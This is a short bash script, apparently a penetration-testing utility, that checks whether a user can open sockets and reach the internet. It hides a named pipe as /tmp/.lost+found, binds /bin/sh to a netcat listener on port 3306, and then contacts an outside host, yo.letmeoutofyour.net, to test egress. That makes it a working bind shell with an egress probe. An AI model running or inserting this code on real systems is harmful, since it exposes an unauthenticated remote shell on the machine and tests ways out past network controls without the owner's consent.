#/bin/bash
#simple shell script to test if the current user can open sockets, bind bash, and egress out
#xgermx still outchea

SCKT_PT=3306

rm -rf /tmp/.lost+found

mknod /tmp/.lost+found p

/bin/sh 0</tmp/.lost+found | nc -lvvp ${SCKT_PT} 1>/tmp/.lost+found &

timeout 5 bash -c "cat < /dev/null > /dev/tcp/0.0.0.0/${SCKT_PT}"

SUCCESS=$?

if [ ${SUCCESS} = 0 ]; then
        echo "Socket successfully opened and closed on localhost via port ${SCKT_PT}"
        echo "GET /" | nc yo.letmeoutofyour.net ${SCKT_PT}
        SUCCESS_INET=$?
                if [ ${SUCCESS_INET} = 0 ]; then
                        echo "Socket successfully opened and closed on internet host via port ${SCKT_PT}"
                else
                        echo "Failed to connect to ${SCKT_PT} on internet host. Server/network may be firewalled."
                fi
else
        echo "Failed to open socket on port ${SCKT_PT}"
fi

rm -rf /tmp/.lost+found